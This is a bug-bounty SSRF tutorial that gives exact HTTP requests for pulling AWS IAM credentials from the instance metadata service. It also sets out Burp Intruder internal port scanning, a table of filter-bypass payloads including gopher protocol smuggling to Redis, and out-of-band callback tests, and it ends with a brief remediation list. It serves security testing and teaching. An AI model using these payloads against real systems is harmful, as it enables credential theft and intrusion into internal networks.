# Real-World SSRF, Cloud Metadata & Port Scanning Reproduction Guide

This comprehensive reference guide details exact step-by-step reproduction instructions for Server-Side Request Forgery (SSRF), internal port scanning, and cloud metadata harvesting based on real-world bug bounty engagements (e.g. Ipsy and Koo case studies) and Jason Haddix's TBHM Lecture 8.

---

## 1. Vulnerability 1: Image Proxy & URL Ingestion SSRF

### Conceptual Overview
Applications frequently resize, crop, or cache external images and documents using backend URL proxying services (e.g., ImageMagick, libcurl, Sharp, or internal microservices). When the proxy endpoint accepts arbitrary external URLs without restricting schemas or destination IP ranges, an attacker can induce the server to request loopback interfaces (`127.0.0.1`), link-local metadata addresses (`169.254.169.254`), or private VPC ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).

### Field Case Study: Shopper Images Microservice
An endpoint responsible for fetching and resizing avatars or product images:
```http
GET /720,fit,q85/https://images.example.com/item.png HTTP/1.1
Host: images.target.com
```
When replacing the image URL with internal destinations:
```http
GET /720,fit,q85/http://169.254.169.254/latest/meta-data/ HTTP/1.1
```
The server fetches the AWS metadata service and returns the response body directly in the HTTP stream or renders it inside a generated image/canvas.

### Step-by-Step Reproduction Instructions

#### Execution Steps
1. **Discover Ingestion Endpoints (Automated Regex Extraction):**
   - Extract parameters taking external URIs from historical and crawled endpoints:
     ```bash
     grep '=' artifacts/all_discovered_urls.txt 2>/dev/null \
       | grep -iE '(url|uri|endpoint|host|server|proxy|dest|destination|redirect|target|src|source|feed|webhook|callback|link|ref|return|path|load|fetch|pull|remote|request)=' \
       | sort -u > artifacts/ssrf_candidates.txt
     ```
   - Path-based proxies: `/cache/{dimensions}/{target_url}` or `/proxy?url={target_url}`
2. **Initial External Interaction Confirmation (Interactsh / Collaborator):**
   - Start an Out-Of-Band (OOB) listener:
     ```bash
     # Launch interactsh client in terminal
     interactsh-client -v
     ```
   - Supply the generated OOB interactsh domain to discovered candidates:
     ```bash
     curl -sk "https://target.com/fetch?url=https://YOUR_INTERACTSH_DOMAIN/test"
     ```
   - Check Interactsh for incoming DNS and HTTP requests.
   - **Crucial Rule:** If only DNS interaction is observed but no HTTP GET request, the service might only perform DNS pre-resolving (or DNS pinging). A full SSRF requires an active HTTP fetch.
3. **Cloud Metadata Extraction (AWS IMDSv1):**
   - Submit the link-local metadata IP:
     ```http
     GET /resize?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
     ```
   - If the endpoint returns metadata category names (e.g., `ami-id`, `instance-id`, `iam`), traverse to the IAM credentials path:
     ```http
     GET /resize?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
     ```
   - Note the role name returned (e.g., `s3-access-role`), then fetch the credentials:
     ```http
     GET /resize?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-access-role HTTP/1.1
     ```
   - **Expected Vulnerable Response:**
     ```json
     {
       "Code": "Success",
       "AccessKeyId": "ASIA...",
       "SecretAccessKey": "...",
       "Token": "...",
       "Expiration": "..."
     }
     ```

---

## 2. Vulnerability 2: Internal Port Scanning via Timing & Error Differentials

### Conceptual Overview
When direct response bodies are not reflected (Semi-Blind SSRF), an attacker can map the internal network topology and open ports on `localhost` or internal subnets by analyzing differences in:
1. **HTTP Status Codes:** `500 Internal Server Error` (closed/rejected port) vs `200 OK` (open HTTP service) vs `504 Gateway Timeout` (filtered port).
2. **Response Latency:** Open ports respond immediately (e.g. 50ms), whereas filtered/non-responsive ports hang until connection timeout (e.g. 10,000ms).

### Step-by-Step Reproduction Instructions

#### Execution Steps
1. **Configure Burp Intruder for Port Enumeration:**
   - Target request:
     ```http
     GET /proxy?url=http://127.0.0.1:§PORT§/ HTTP/1.1
     Host: target.com
     ```
2. **Select Common Internal Ports:**
   - `21` (FTP), `22` (SSH), `25` (SMTP), `80` (HTTP), `443` (HTTPS), `3306` (MySQL), `5432` (PostgreSQL), `6379` (Redis), `8080` (Internal Web Apps), `9200` (Elasticsearch), `11211` (Memcached).
3. **Sort and Analyze Intruder Results:**
   - Sort by **Response Completed Length** and **Response Received Time**.
   - A port returning `400 Bad Request` or `Empty reply from server` indicates a non-HTTP service is listening (e.g., SSH or Redis receiving HTTP verb).
   - A port timing out after 10–30 seconds indicates the port is firewalled/filtered.
   - An immediate response indicating connection refused indicates the port is closed.

---

## 3. Vulnerability 3: Filter Evasion & Parser Differential Bypasses

When the target validates or blacklists `127.0.0.1` or `169.254.169.254`, apply the following encodings:

| Technique | Payload Example |
| :--- | :--- |
| **Shortened Localhost** | `http://127.1/` or `http://0/` or `http://0.0.0.0/` |
| **Decimal Encoding** | `http://2130706433/` (`127.0.0.1`) / `http://2852039166/` (`169.254.169.254`) |
| **Hexadecimal Encoding** | `http://0x7f000001/` / `http://0xa9fea9fe/` |
| **Octal Encoding** | `http://017700000001/` |
| **Enclosed Alphanumerics** | `http://①②⑦.⓪.⓪.①/` |
| **DNS Rebinding & Local CNAME** | `http://localtest.me` or `http://spoofed.burpcollaborator.net` |
| **URL Parser Confusion** | `http://target.com@127.0.0.1/` or `http://127.0.0.1#@target.com` |
| **Protocol Smuggling** | `gopher://127.0.0.1:6379/_INFO` or `dict://127.0.0.1:11211/` |

---

## Remediation & Defensive Controls
1. **Require IMDSv2:** Enforce AWS Instance Metadata Service Version 2 (`HttpTokens=required`, hop limit = 1), requiring a `PUT` request with `X-aws-ec2-metadata-token` header.
2. **Network Layer Egress Filtering:** Restrict application servers from making egress connections to internal RFC 1918 subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and link-local ranges (`169.254.169.254`).
3. **Strict Destination Whitelisting:** Validate destination hostnames against a strict regex whitelist of pre-approved third-party image CDNs.
4. **Resolve and Pin DNS Before Fetching:** Resolve domain names to IP addresses server-side, verify the resolved IP is not private/reserved, and connect directly to that pinned IP to prevent DNS rebinding.
